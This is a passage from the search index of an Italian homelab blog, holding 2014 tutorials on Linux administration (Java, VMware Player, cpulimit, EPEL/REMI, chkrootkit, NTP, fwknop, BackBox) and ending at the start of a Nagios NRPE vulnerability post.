meno costrutti a basso livello e implementa in modo più puro (rispetto al C++) il paradigma object-oriented.\nUn buon punto di partenza per imparare Java è il tutorial ufficiale[4].\n","permalink":"https://www.homelab.it/index.php/2014/05/23/come-installare-java-su-centos-6-jdk/","summary":"Download ed installazione Java (ultima versione)   Aprire il browser e inserie l’indirizzo: http://www.oracle.com/technetwork/java/javase/overview/index.html\n  Cliccare sul bottone Download:\n  \nCliccare sull’icona Download:   \nSelezionare il bottone ratio “Accept License Agreement“:  \nScaricare il pacchetto rpm a seconda dell’architettura del proprio sistema:   jdk-8u5-linux-i586.rpm jdk-8u5-linux-x64.rpm   Copiare il file rpm tramite scp client (se la macchina CentOS 6 è remota).\n  Con i privilegi di root installare il pacchetto rpm (nel mio caso i586) :","title":"Come installare Java su CentOS 6 (JDK)"},{"content":"La seguente procedura è stata testata sia su CentOS 6 che Ubuntu 14.04, ma è applicabile anche ad altre distribuzioni.\nSul sistema linux dovrà essere installato l’ambiente grafico, in caso contrario potete far riferimento al mio articolo che spiega come installarlo sulle distribuzioni CentOS:\nhttp://www.homelab.it/index.php/2014/05/21/come-installare-lambiente-grafico-su-linux-centos-in-tre-passi/\n Download VMware Player   Per prima cosa scariscari la versione più aggiornata di VMware Player dal sito ufficiale: http://www.vmware.com/\nNel menu Downloads è possibile cliccare la voce “Player“:\n\nScaricare il pacchetto adatto al proprio sistema, 32 o 64 bit:\n\nConcluso il download, da root rendere eseguibile il pacchetto appena scaricato e far partire l’installazione.\nCentOS:\n[root@centos6 ~]# chmod +x VMware-Player-6.0.2-1744117.x86_64.bundle [root@centos6 ~]# ./VMware-Player-6.0.2-1744117.x86_64.bundle Ubuntu:\nclaudio@ubuntu:~/Scaricati$ chmod +x VMware-Player-6.0.2-1744117.x86_64.bundle claudio@ubuntu:~/Scaricati$ sudo ./VMware-Player-6.0.2-1744117.x86_64.bundle  Accettare i termini di licenza per VMware Player:  \nAccettare i termini di licenza per le VMware Tools:  \nScegliere se consentire il controllo degli aggiornamenti ad ogni avvio del player:  \n4) Scegliere se inviare o meno in maniera anonima le statistiche di utilizzo del player verso VMware:\n\nLasciare vuoto il campo relativo alla licenza:  \n6) Preme il bottone “Install” e attendere il completamento del processo:\n\nPreme il tasto “Close” per terminare l’installazione:  \nAvvio di VMware Player Per far partire il player è sufficiente eseguire da terminale il comando:\nclaudio@ubuntu:~/Scaricati$ vmplayer \u0026amp;\naltrimenti cliccare sull’icona  del proprio desktop manager.\nLicenza VMware Player VMware Player viene rilasciato con licenza gratuita per uso personale quindi NON commerciale, in caso contrario è necessario acqustarne una dal sito www.vmware.com .\n","permalink":"https://www.homelab.it/index.php/2014/05/21/come-installare-vmware-player-su-linux/","summary":"La seguente procedura è stata testata sia su CentOS 6 che Ubuntu 14.04, ma è applicabile anche ad altre distribuzioni.\nSul sistema linux dovrà essere installato l’ambiente grafico, in caso contrario potete far riferimento al mio articolo che spiega come installarlo sulle distribuzioni CentOS:\nhttp://www.homelab.it/index.php/2014/05/21/come-installare-lambiente-grafico-su-linux-centos-in-tre-passi/\n Download VMware Player   Per prima cosa scariscari la versione più aggiornata di VMware Player dal sito ufficiale: http://www.vmware.com/\nNel menu Downloads è possibile cliccare la voce “Player“:","title":"Come installare VMware Player su Linux"},{"content":" Downlaod e installazione ambiente grafico su CentOS 6 Se il vostro scopo è quello di installare l’ambiente grafico in una distribuzione CentOS, precedentemente configurata in modalità testuale, vi basteranno 3 semplici comandi:\n[root@centos6 ~]# yum -y groupinstall \u0026#34;X Window System\u0026#34; [root@centos6 ~]# [root@centos6 ~]# yum -y groupinstall \u0026#34;Desktop\u0026#34; [root@centos6 ~]# [root@centos6 ~]# yum -y groupinstall \u0026#34;General Purpose Desktop\u0026#34; Yum comincerà a scaricare ed installare una grossa quantità di pacchetti ed il tempo stimato per la conclusione varierà a seconda delle performance della vosta macchina e connessione internet.\nUna volta conclusa l’installazione, non vi resta che far partire l’ambiente grafico:\n[root@centos6 ~]# startx\n","permalink":"https://www.homelab.it/index.php/2014/05/21/come-installare-lambiente-grafico-su-linux-centos-in-tre-passi/","summary":"Downlaod e installazione ambiente grafico su CentOS 6 Se il vostro scopo è quello di installare l’ambiente grafico in una distribuzione CentOS, precedentemente configurata in modalità testuale, vi basteranno 3 semplici comandi:\n[root@centos6 ~]# yum -y groupinstall \u0026#34;X Window System\u0026#34; [root@centos6 ~]# [root@centos6 ~]# yum -y groupinstall \u0026#34;Desktop\u0026#34; [root@centos6 ~]# [root@centos6 ~]# yum -y groupinstall \u0026#34;General Purpose Desktop\u0026#34; Yum comincerà a scaricare ed installare una grossa quantità di pacchetti ed il tempo stimato per la conclusione varierà a seconda delle performance della vosta macchina e connessione internet.","title":"Come installare l’ambiente grafico su Linux CentOS in tre comandi"},{"content":"Per limitare l’utilizzo della cpu sui sistemi linux è possibile usufruire dell’utility CPULIMIT.\n Installazione Cpulimit   Debian/Ubuntu\nclaudio@ubuntu:~$ sudo apt-get install cpulimit\nCentOS 6\nPrima di tutto installare il repository EPEL seguendo le istruzioni di questo articolo (REMI non è necessario):\nhttp://www.homelab.it/index.php/2014/05/20/come-installare-i-repositories-epel-e-remi-su-centos-6\nUna volta acquisito il repository, installare cpulimit:\n[root@centos6 ~]# yum install cpulimit\nTest Cpulimit   Per spiegare il funzionamento di cpulimit nel migliore dei modi, utilizzerò uno script bash che creerà loop fino a portare la CPU al limite.\nTramite editor creare un file dal nome loop.sh e srivere:\n#!/bin/bash while true do :; done Salvare il file e renderlo eseguibile:\n[root@centos6 ~]# chmod +x loop.sh Eseguire lo script in background:\n[root@centos6 ~]# ./loop.sh \u0026amp; [1] 8928 \u0026lt;-- Numero pid processo [root@centos6 ~]# Controllare l’utilizzo della cpu da parte dello script loop.sh:\n[root@centos6 ~]# top top - 23:05:08 up 6 days, 12:44, 1 user, load average: 0.51, 0.64, 0.36 Tasks: 100 total, 2 running, 98 sleeping, 0 stopped, 0 zombie Cpu(s): 33.3%us, 0.1%sy, 0.0%ni, 66.6%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st Mem: 2979068k total, 2825512k used, 153556k free, 424712k buffers Swap: 1675256k total, 47504k used, 1627752k free, 2170224k cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 8928 root 20 0 5060 1144 1012 R 100.0 0.0 7:01.62 loop.sh Come si può notare lo script sta spremendo il processore al massimo.\nPer limitare l’utilizzo al 30% tramite cpulimit, individuare il numero pid del processo e scrivere:\n[root@centos6 ~]# cpulimit -l 30 -p 8928 \u0026amp; [2] 8956 Process 8928 detected [root@centos6 ~]# Ricontrollare lo stato del processo per confermare l’applicazione del limite:\n[root@centos ~]# top top - 23:09:34 up 6 days, 12:48, 1 user, load average: 0.39, 0.60, 0.42 Tasks: 101 total, 1 running, 99 sleeping, 1 stopped, 0 zombie Cpu(s): 0.0%us, 0.0%sy, 0.3%ni, 99.5%id, 0.2%wa, 0.0%hi, 0.0%si, 0.0%st Mem: 2979068k total, 2825140k used, 153928k free, 424712k buffers Swap: 1675256k total, 47504k used, 1627752k free, 2170224k cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 8928 root Per terminare l’utilizzo di cpulimit basta cercare il numero pid ed eseguire il comando kill:\n[root@centos6 ~]# ps aux | grep cpulimit root 8956 0.0 0.0 2184 576 pts/0 S\u0026lt; 23:07 0:00 cpulimit -l 30 -p 8928 root 8960 0.0 0.0 4364 744 pts/0 S+ 23:12 0:00 grep cpulimit [root@centos6 ~]# kill -9 8956 [2]- Killed cpulimit -l 30 -p 8928 [root@centos6 ~]# Tengo a precisare che al momento dell’esecuzione di cpulimit è possibile specificare anche il nome dell’esegubile, a discapito del numero pid, con lo switch: -e nomeprocesso\n(La procedura è compatibile sia su CentOS6, Ubuntu e Debian)\n","permalink":"https://www.homelab.it/index.php/2014/05/20/come-limitare-lutilizzo-della-cpu-di-unapplicazione-su-linux/","summary":"Per limitare l’utilizzo della cpu sui sistemi linux è possibile usufruire dell’utility CPULIMIT.\n Installazione Cpulimit   Debian/Ubuntu\nclaudio@ubuntu:~$ sudo apt-get install cpulimit\nCentOS 6\nPrima di tutto installare il repository EPEL seguendo le istruzioni di questo articolo (REMI non è necessario):\nhttp://www.homelab.it/index.php/2014/05/20/come-installare-i-repositories-epel-e-remi-su-centos-6\nUna volta acquisito il repository, installare cpulimit:\n[root@centos6 ~]# yum install cpulimit\nTest Cpulimit   Per spiegare il funzionamento di cpulimit nel migliore dei modi, utilizzerò uno script bash che creerà loop fino a portare la CPU al limite.","title":"Come limitare l’utilizzo della CPU di un’applicazione su Linux"},{"content":" Introduzione Fonte: https://fedoraproject.org/wiki/EPEL/it\n‘Extra Packages for Enterprise Linux’ (o EPEL) è un gruppo speciale di utenti (Fedora Special Interest Group) che si interessa di creare, mantenere e gestire pacchetti RPM addizionali di alta qualità per Enterprise Linux, includendo, ma non limitato, Red Hat Enterprise Linux (RHEL), CentOS e Scientific Linux (SL).\nI pacchetti EPEL sono solitamente basati sulla loro controparte in Fedora, non saranno mai in conflitto né un rimpiazzo con quelli base per le distribuzioni Enterprise Linux. EPEL usa parte della stessa infrastruttura usata per Fedora, inclusi buildsystem, bugzilla instance, update manager, mirror manager ed altro.\nPer saperne di più su EPEL, seguire le seguenti pagine:\n  EPEL FAQ\n  About EPEL\n  Politiche e Linee guida di EPEL\n   Installazione repository EPEL   [root@centos6 ~]# rpm -Uhv http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm Ripristino di http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm avvertimento: /var/tmp/rpm-tmp.T0Yctu: Header V3 RSA/SHA256 Signature, key ID 0608b895: NOKEY Preparazione in corso... ########################################### [100%] 1:epel-release ########################################### [100%] [root@centos6 ~]# \nIntroduzione REMI Fonte: http://blog.famillecollet.com/pages/English-site-introduction\nIntroduction This site exposes my “little” contribution to the free community.\nFor some time now, I use linux on all my personal computers. And I choose the Fedora distribution mainly because I most often, and for years, use various RedHat versions for my professional activities.\nFedora, like some other distributions, use the RPM package format (Cf RPM.org) to distribute or install software and maintain a coherent operating system. You will find those I have build on this site. I build them because I need them and I don’t find them anywhere else. I generally use them on my personal computer to test a new version (ex: firefox 4) and also on servers I manage (ex: php-oci8). I hope they will be also useful to you.\nThis site is also a YUM repository (Cf. Yellow dog Updater, Modified) which allow a really simple installation and dependency management.\nRemember to read the Configuration page.\nThis site is also a Blog, first to simplify its maintenance, but also to allow you to give some feedback to my work.\nContact To ask for help, or get explanations, or simply to have free discussion about the provided packages in the repository, you should use the dedicated forums on http://forums.famillecollet.com/\nWe can also meet on #fedora-fr or #remirepo IRC channel (irc.freenode.net), I’m know there as RemiFedora.\nInstallazione repository REMI   *il pacchetto REMI dipende da EPEL\n[root@centos6 ~]# rpm -Uhv http://rpms.famillecollet.com/enterprise/remi-release-6.rpm Ripristino di http://rpms.famillecollet.com/enterprise/remi-release-6.rpm avvertimento: /var/tmp/rpm-tmp.Ca3Ykk: Header V3 DSA/SHA1 Signature, key ID 00f97f56: NOKEY Preparazione in corso... ########################################### [100%] 1:remi-release ########################################### [100%] [root@centos6 ~]# da root editare il file “/etc/yum.repos.d/remi.repo” e modificare il campo enabled=0 in enabled=1 nella sezione [remi]:\n[remi] name=Les RPM de remi pour Enterprise Linux 6 - $basearch #baseurl=http://rpms.famillecollet.com/enterprise/6/remi/$basearch/ mirrorlist=http://rpms.famillecollet.com/enterprise/6/remi/mirror enabled=1 gpgcheck=1 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-remi ","permalink":"https://www.homelab.it/index.php/2014/05/20/come-installare-i-repositories-epel-e-remi-su-centos-6/","summary":"Introduzione Fonte: https://fedoraproject.org/wiki/EPEL/it\n‘Extra Packages for Enterprise Linux’ (o EPEL) è un gruppo speciale di utenti (Fedora Special Interest Group) che si interessa di creare, mantenere e gestire pacchetti RPM addizionali di alta qualità per Enterprise Linux, includendo, ma non limitato, Red Hat Enterprise Linux (RHEL), CentOS e Scientific Linux (SL).\nI pacchetti EPEL sono solitamente basati sulla loro controparte in Fedora, non saranno mai in conflitto né un rimpiazzo con quelli base per le distribuzioni Enterprise Linux.","title":"Come installare i repositories EPEL e REMI su CentOS 6"},{"content":"\nChkrootkit è una raccolta di script e tools scritti in C che aiutanto gli amministratori di sistema a rilevare eventuali rootkit o LKM maligni installati sui sistemi Linux.\nPer installare chrootkit su CentOS 6, basta usufruire del repository EPEL tramite yum.\n Installare il repository EPEL   [root@centos6 ~]# rpm -Uhv http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm\rRipristino di http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm\ravvertimento: /var/tmp/rpm-tmp.T0Yctu: Header V3 RSA/SHA256 Signature, key ID 0608b895: NOKEY\rPreparazione in corso... ########################################### [100%]\r1:epel-release ########################################### [100%]\r[root@centos6 ~]# Installare chkrootkit   [root@centos6 ~]# yum install chkrootkit Eseguire scansione chrootkit   [root@centos6 ~]# chkrootkit\rROOTDIR is `/\u0026#39;\rChecking `amd\u0026#39;... not found\rChecking `basename\u0026#39;... not infected\rChecking `biff\u0026#39;... not found\rChecking `chfn\u0026#39;... not infected\rChecking `chsh\u0026#39;... not infected\rChecking `cron\u0026#39;... not infected\rChecking `crontab\u0026#39;... not infected\rChecking `date\u0026#39;... not infected\rChecking `du\u0026#39;... not infected\rChecking `dirname\u0026#39;... not infected\rChecking `echo\u0026#39;... not infected\rChecking `egrep\u0026#39;... not infected\rChecking `env\u0026#39;... not infected\rChecking `find\u0026#39;... not infected\rChecking `fingerd\u0026#39;... not found\rChecking `gpm\u0026#39;... not found\rChecking `grep\u0026#39;... not infected\rChecking `hdparm\u0026#39;... not found\rChecking `su\u0026#39;... not infected\rChecking `ifconfig\u0026#39;... not infected\rChecking `inetd\u0026#39;... not found\rChecking `inetdconf\u0026#39;... not found\rChecking `identd\u0026#39;... not found\rChecking `init\u0026#39;... not infected\rChecking `killall\u0026#39;... not infected\rChecking `ldsopreload\u0026#39;... not infected\rChecking `login\u0026#39;... not infected\rChecking `ls\u0026#39;... not infected\rChecking `lsof\u0026#39;... not found\rChecking `mail\u0026#39;... not found\rChecking `mingetty\u0026#39;... not infected\rChecking `netstat\u0026#39;... not infected\rChecking `named\u0026#39;... not found\rChecking `passwd\u0026#39;... not infected\rChecking `pidof\u0026#39;... not infected\rChecking `pop2\u0026#39;... not found\rChecking `pop3\u0026#39;... not found\rChecking `ps\u0026#39;... not infected\rChecking `pstree\u0026#39;... not infected\rChecking `rpcinfo\u0026#39;... not found\rChecking `rlogind\u0026#39;... not found\rChecking `rshd\u0026#39;... not found\rChecking `slogin\u0026#39;... not infected\rChecking `sendmail\u0026#39;... not infected\rChecking `sshd\u0026#39;... not infected\rChecking `syslogd\u0026#39;... not tested\rChecking `tar\u0026#39;... not infected\rChecking `tcpd\u0026#39;... not infected\rChecking `tcpdump\u0026#39;... not infected\rChecking `top\u0026#39;... not infected\rChecking `telnetd\u0026#39;... not found\rChecking `timed\u0026#39;... not found\rChecking `traceroute\u0026#39;... not found\rChecking `vdir\u0026#39;... not infected\rChecking `w\u0026#39;... not infected\rChecking `write\u0026#39;... not infected\rChecking `aliens\u0026#39;... no suspect files\rSearching for sniffer\u0026#39;s logs, it may take a while... nothing found\rSearching for HiDrootkit\u0026#39;s default dir... nothing found\rSearching for t0rn\u0026#39;s default files and dirs... nothing found\rSearching for t0rn\u0026#39;s v8 defaults... nothing found\rSearching for Lion Worm default files and dirs... nothing found\rSearching for RSHA\u0026#39;s default files and dir... nothing found\rSearching for RH-Sharpe\u0026#39;s default files... nothing found\rSearching for Ambient\u0026#39;s rootkit (ark) default files and dirs... nothing found\rSearching for suspicious files and dirs, it may take a while...\r/usr/lib/.libcrypto.so.10.hmac /usr/lib/.libssl.so.10.hmac /usr/lib/.libcrypto.so.1.0.1e.hmac /usr/lib/.libssl.so.1.0.1e.hmac /lib/.libfipscheck.so.1.hmac /lib/.libfipscheck.so.1.1.0.hmac /lib/.libgcrypt.so.11.hmac\rSearching for LPD Worm files and dirs... nothing found\rSearching for Ramen Worm files and dirs... nothing found\rSearching for Maniac files and dirs... nothing found\rSearching for RK17 files and dirs... nothing found\rSearching for Ducoci rootkit... nothing found\rSearching for Adore Worm... nothing found\rSearching for ShitC Worm... nothing found\rSearching for Omega Worm... nothing found\rSearching for Sadmind/IIS Worm... nothing found\rSearching for MonKit... nothing found\rSearching for Showtee... nothing found\rSearching for OpticKit... nothing found\rSearching for T.R.K... nothing found\rSearching for Mithra... nothing found\rSearching for LOC rootkit... nothing found\rSearching for Romanian rootkit... nothing found\rSearching for HKRK rootkit... nothing found\rSearching for Suckit rootkit... nothing found\rSearching for Volc rootkit... nothing found\rSearching for Gold2 rootkit... nothing found\rSearching for TC2 Worm default files and dirs... nothing found\rSearching for Anonoying rootkit default files and dirs... nothing found\rSearching for ZK rootkit default files and dirs... nothing found\rSearching for ShKit rootkit default files and dirs... nothing found\rSearching for AjaKit rootkit default files and dirs... nothing found\rSearching for zaRwT rootkit default files and dirs... nothing found\rSearching for Madalin rootkit default files... nothing found\rSearching for Fu rootkit default files... nothing found\rSearching for ESRK rootkit default files... nothing found\rSearching for rootedoor... nothing found\rSearching for ENYELKM rootkit default files... nothing found\rSearching for common ssh-scanners default files... nothing found\rSearching for anomalies in shell history files... nothing found\rChecking `asp\u0026#39;... not infected\rChecking `bindshell\u0026#39;... not infected\rChecking `lkm\u0026#39;... chkproc: nothing detected\rchkdirs: nothing detected\rChecking `rexedcs\u0026#39;... not found\rChecking `sniffer\u0026#39;... eth0: not promisc and no PF_PACKET sockets\rChecking `w55808\u0026#39;... not infected\rChecking `wted\u0026#39;... chkwtmp: nothing deleted\rChecking `scalper\u0026#39;... not infected\rChecking `slapper\u0026#39;... not infected\rChecking `z2\u0026#39;... chklastlog: nothing deleted\rChecking `chkutmp\u0026#39;... chkutmp: nothing deleted\rChecking `OSX_RSPLUG\u0026#39;... not infected\r[root@centos6 ~]# Stampare output chkrootkit solo in caso di rilevamento anomalie   [root@centos6 ~]# chkrootkit| grep INFECTED Se l’output sarà vuoto vuol dire che il programma non ha riscontrato nessuna anomalia.\nSchedulazione scansione chkroorkit ed invio report tramite e-mail   Per schedulare una scansione automatica del proprio sistema Linux, basta creare uno semplice script da eseguire tramite il demone cron.\nPonendo il caso di voler effettuare una scansione settimanale, si deve creare il file “/etc/cron.weekly/chkrootkit” ed al suo interno scrivere:\n#!/bin/sh\r# Generatore data/ora stile: HH:mm dd/mm/YYYY\rdata=$(date \u0026#34;+%H:%M %d/%m/%Y\u0026#34;)\r# Indirizzo e-mail destinatario report\remail=\u0026#34;tua@email.it\u0026#34;\r# Esegui WPScan ed invia report per e-mail\rchkrootkit | mail -s \u0026#34;Scansione automatica chkrootkit $data\u0026#34; $email Per concludere la procedura, rendere eseguibile lo script:\n[root@centos6 ~]# chmod +x /etc/cron.weekly/chkrootkit ","permalink":"https://www.homelab.it/index.php/2014/05/20/chkrootkit-come-installare-e-schedulare-rootkit-scanner-su-linux/","summary":"Chkrootkit è una raccolta di script e tools scritti in C che aiutanto gli amministratori di sistema a rilevare eventuali rootkit o LKM maligni installati sui sistemi Linux.\nPer installare chrootkit su CentOS 6, basta usufruire del repository EPEL tramite yum.\n Installare il repository EPEL   [root@centos6 ~]# rpm -Uhv http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm\rRipristino di http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm\ravvertimento: /var/tmp/rpm-tmp.T0Yctu: Header V3 RSA/SHA256 Signature, key ID 0608b895: NOKEY\rPreparazione in corso... ########################################### [100%]\r1:epel-release ########################################### [100%]\r[root@centos6 ~]# Installare chkrootkit   [root@centos6 ~]# yum install chkrootkit Eseguire scansione chrootkit   [root@centos6 ~]# chkrootkit\rROOTDIR is `/\u0026#39;\rChecking `amd\u0026#39;.","title":"Chkrootkit – Come installare e schedulare rootkit scanner su Linux"},{"content":" Installare ntp server su CentOS 6 NTP (Network Time Protocol) è un protocollo che viene utilizzato per sincronizzare l’orario dei computer all’interno di una rete pubblica o privata, su linux troviamo il server ntpd e il client ntpdate\nSu Linux CentOS 6 il demone ntp è installabile tramite yum:\n[root@cento6 ~]# yum install ntp ... ... ... Running Transaction Installing : ntpdate-4.2.6p5-1.el6.centos.i686 1/2 Installing : ntp-4.2.6p5-1.el6.centos.i686 2/2 Verifying : ntp-4.2.6p5-1.el6.centos.i686 1/2 Verifying : ntpdate-4.2.6p5-1.el6.centos.i686 2/2 Installed: ntp.i686 0:4.2.6p5-1.el6.centos Dependency Installed: ntpdate.i686 0:4.2.6p5-1.el6.centos Complete! [root@cento6 ~]# Nel caso in cui ci fossero le connessioni bloccate in input dal firewall, aprire la porta udp 123:\n[root@centos6 ~]# iptables -I INPUT -i eth0 -p udp --dport 123 -j ACCEPT\nAprire il file “/etc/ntp.conf” con l’editor preferito e sostituire le righe:\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server 0.centos.pool.ntp.org iburst server 1.centos.pool.ntp.org iburst server 2.centos.pool.ntp.org iburst server 3.centos.pool.ntp.org iburst con:\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server ntp1.inrim.it server ntp2.inrim.it In questo caso la distribuzione CentOS si sincronizzerà con i server ntp I.N.RI.M e ridistribuirà l’orario ai client da cui riceverà le richieste.\nPer far partire il servizio digitare:\n[root@centos6 ~]# /etc/init.d/ntpd start Avvio di ntpd: [ OK ] [root@centos6 ~]# Per rendere il servizio eseguibile ad ogni avvio del sistema scrivere:\n[root@centos6 ~]# chkconfig ntpd on\n","permalink":"https://www.homelab.it/index.php/2014/05/19/come-installare-e-configurare-ntp-server-su-centos-6/","summary":"Installare ntp server su CentOS 6 NTP (Network Time Protocol) è un protocollo che viene utilizzato per sincronizzare l’orario dei computer all’interno di una rete pubblica o privata, su linux troviamo il server ntpd e il client ntpdate\nSu Linux CentOS 6 il demone ntp è installabile tramite yum:\n[root@cento6 ~]# yum install ntp ... ... ... Running Transaction Installing : ntpdate-4.2.6p5-1.el6.centos.i686 1/2 Installing : ntp-4.2.6p5-1.el6.centos.i686 2/2 Verifying : ntp-4.","title":"Come installare e configurare ntp server su CentOS 6"},{"content":"fwknop 2.6.2 IPFire Linux addon (unofficial) tested on versions: 2.15 core update 75,76,77 with Pakfire 2.\nDownload Fwknop 2.6.2 client: DOWNLOAD (MD5: 11714c99dce5171191eb6735c3a4729a )\nFwknop 2.6.2 server: DOWNLAOD (MD5: 8e1072229f483824d51844c0b84d0b52 )\nRequirements fwknop  IPFire 2.x i386 Pakfire 2 Gpgme package  Installation fwknop Copy packets via scp client to “/opt/pakfire/tmp/” IPFire directory.\n[root@ipfire ~]# cd /opt/pakfire/tmp/\r[root@ipfire tmp]# ls\rfwknopclient-2.6.2-1.ipfire.gz\r[root@ipfire tmp]#\r[root@ipfire tmp]# tar xvfz fwknopclient-2.6.2-1.ipfire.gz\rfiles.tar.xz\rinstall.sh\rROOTFILES\runinstall.sh\rupdate.sh\r[root@ipfire tmp]# ./install.sh\rExtracting files...\rtar: Record size = 16 blocks\rusr/\rusr/local/\rusr/local/include/\rusr/local/include/fko.h\rusr/local/bin/\rusr/local/bin/fwknop\rusr/local/lib/\rusr/local/lib/libfko.la\rusr/local/lib/libfko.so.2.0.2\rusr/local/lib/libfko.so.2\rusr/local/lib/libfko.so\rusr/local/lib/libfko.a\r...Finished.\r[root@ipfire tmp]#\r[root@ipfire tmp]# rm -rf *\r[root@ipfire tmp]#\r[root@ipfire tmp]# fwknop -V\rfwknop client 2.6.2, FKO protocol version 2.0.2\r[root@ipfire tmp]# Uninstall [root@ipfire ~]# cd /opt/pakfire/tmp/\r[root@ipfire tmp]# ls\rfwknopclient-2.6.2-1.ipfire.gz\r[root@ipfire tmp]#\r[root@ipfire tmp]# tar xvfz fwknopclient-2.6.2-1.ipfire.gz\rfiles.tar.xz\rinstall.sh\rROOTFILES\runinstall.sh\rupdate.sh\r[root@ipfire tmp]# ./uninstall.sh\rRemoving files...\rremoved `/usr/local/bin/fwknop\u0026#39;\rremoved `/usr/local/include/fko.h\u0026#39;\rremoved `/usr/local/lib/libfko.a\u0026#39;\rremoved `/usr/local/lib/libfko.la\u0026#39;\rremoved `/usr/local/lib/libfko.so\u0026#39;\rremoved `/usr/local/lib/libfko.so.2\u0026#39;\rremoved `/usr/local/lib/libfko.so.2.0.2\u0026#39;\r...Finished.\r[root@ipfire tmp]#\r[root@ipfire tmp]# rm -rf *\r[root@ipfire tmp]# ","permalink":"https://www.homelab.it/index.php/2014/05/15/fwknop-client-and-fwknop-server-2-6-2-packages-for-ipfire-linux-2-x-i386-pakfire-2/","summary":"fwknop 2.6.2 IPFire Linux addon (unofficial) tested on versions: 2.15 core update 75,76,77 with Pakfire 2.\nDownload Fwknop 2.6.2 client: DOWNLOAD (MD5: 11714c99dce5171191eb6735c3a4729a )\nFwknop 2.6.2 server: DOWNLAOD (MD5: 8e1072229f483824d51844c0b84d0b52 )\nRequirements fwknop  IPFire 2.x i386 Pakfire 2 Gpgme package  Installation fwknop Copy packets via scp client to “/opt/pakfire/tmp/” IPFire directory.\n[root@ipfire ~]# cd /opt/pakfire/tmp/\r[root@ipfire tmp]# ls\rfwknopclient-2.6.2-1.ipfire.gz\r[root@ipfire tmp]#\r[root@ipfire tmp]# tar xvfz fwknopclient-2.6.2-1.ipfire.gz\rfiles.tar.xz\rinstall.sh\rROOTFILES\runinstall.","title":"fwknop-client and fwknop-server 2.6.2  packages for IPFire Linux 2.x i386 (Pakfire 2)"},{"content":"\nNel precedente articolo ho fatto una panoramica generale della distribuzione BackBox 3.x:\nhttps://www.homelab.it/index.php/2014/05/10/backbox-penetration-testing-made-in-italy/\nIn questo nuovo post ho inserito due video dove spiego passo passo come installare la distribuzine su VMware Workstation, ma è applicabile anche su pc/notebook fisici.\nInstallare BackBox Parte 1   Installare BackBox Parte 2   ","permalink":"https://www.homelab.it/index.php/2014/05/13/come-installare-backbox-3-x/","summary":"\nNel precedente articolo ho fatto una panoramica generale della distribuzione BackBox 3.x:\nhttps://www.homelab.it/index.php/2014/05/10/backbox-penetration-testing-made-in-italy/\nIn questo nuovo post ho inserito due video dove spiego passo passo come installare la distribuzine su VMware Workstation, ma è applicabile anche su pc/notebook fisici.\nInstallare BackBox Parte 1   Installare BackBox Parte 2   ","title":"Come installare BackBox 3.x"},{"content":"\nGuida installazione: https://www.homelab.it/index.php/2014/05/13/come-installare-backbox-3-x/\nPanoramica BackBox Backbox è una distribuzione Linux tutta italiana orientata al Penetration Testing e Vulnerability Assessment and Mitigation.\nLa distribuzione nasce nel 2010 da un’idea di Raffaele Forte e ai giorni d’oggi vanta lo sviluppo di un’intera community.\nIl successo di Backbox è dovuto dovuto alla sua facilità d’uso e alle elevate performance, infatti si basa sulla distribuzione Ubuntu e come window manager utilizza XFCE.\nDa notare i bassissimi requisiti hardware:\n 32-bit or 64-bit processor 512 MB of system memory (RAM) 4.4 GB of disk space for installation Graphics card capable of 800×600 resolution DVD-ROM drive or USB port  Al suo interno è possibile trovare una vastissima raccolta di programmi utilizzabili nell’ambito dell’informatica forense e nell’analisi delle reti o applicazioni, il tutto categorizzato sotto il menù “Auditing“.\n\nUna funzionalità molto interessante che ha fatto migrare molti utenti dalla famosa distro Kali Linux a BackBox si chiama “Anonymous” e si trova nel menù principale sotto forma di servizio attivabile a proprio piacimento.\nQuesta funzione si basa sul sistema di comunicazione anonima TOR (The Onion Router), ma a differeza delle altre distribuzioni non si limita a instradare il traffico web verso tor ma bensì tutte le connessioni e protocolli.\nIl vantaggio di tutto ciò porta a non dovere personalizzare ogni programma o client che si vuole utilizzare dato che ci penserà il servizio Anonymous.\nUn’altra funzionalità a cui rendere nota si chiama “Update” e anche questa si trova nel menù principale.\n\nA differenza dell’update manager di sistema, questo programma è stato creato ad hoc per aggiornare i database dei vari programmi, ad sempio wpscan e metasploit scaricheranno nuovi exploit mentre sqlmap nuove tecniche sql d’intrusione.\nLa distribuzione naturalmente è gratuita, distribuita sotto licenza GPL, ed è scaricabile all’indirizzo: http://www.backbox.org/downloads\nAl momento del download è possibile scegliere se fare una donazione o meno (mettendo 0) ,il protocollo con cui scaricare l’iso (http/torrent) e l’architettura del sistema (i386/amd_64)\n\nLa distribuzione attualmente è arrivata alla versione stabile numero 3, mentre in fase di test la versione 4.\nPer avere una lista completa dei programmi installati è possibile consultare la pagina https://launchpad.net/~backbox.\n","permalink":"https://www.homelab.it/index.php/2014/05/10/backbox-penetration-testing-made-in-italy/","summary":"Guida installazione: https://www.homelab.it/index.php/2014/05/13/come-installare-backbox-3-x/\nPanoramica BackBox Backbox è una distribuzione Linux tutta italiana orientata al Penetration Testing e Vulnerability Assessment and Mitigation.\nLa distribuzione nasce nel 2010 da un’idea di Raffaele Forte e ai giorni d’oggi vanta lo sviluppo di un’intera community.\nIl successo di Backbox è dovuto dovuto alla sua facilità d’uso e alle elevate performance, infatti si basa sulla distribuzione Ubuntu e come window manager utilizza XFCE.\nDa notare i bassissimi requisiti hardware:","title":"BackBox – Penetration Testing Made in Italy"},{"content":"\n  Informazioni generali Qualche giorno fa è stato scovato un bug sul noto monitor d’infrastrutture Nagios, più precisamente la vurnerabilità riguarda l’agent NRPE (Nagios Remote Plugin Executor).\n============================================= - Release date: 17.04.2014 - Discovered by: Dawid Golunski - Severity: High ============================================= CVE: 2014-2913\nNrpe è un agent che viene installato su tutte le macchine monitorare da Nagios e a seconda delle varie 